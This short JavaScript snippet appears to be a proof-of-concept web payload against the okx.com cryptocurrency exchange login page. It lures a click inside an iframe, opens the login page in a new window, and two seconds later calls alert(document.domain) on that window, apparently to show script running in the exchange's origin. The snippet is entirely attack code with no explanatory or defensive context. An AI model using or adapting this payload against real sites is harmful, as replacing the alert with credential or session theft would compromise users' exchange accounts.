document.write('Click anywhere in this iframe :)');

onclick = () => {

w = open('https://www.okx.com/account/login');

setTimeout(() => {
 w.alert(document.domain);
}, 2000);

}
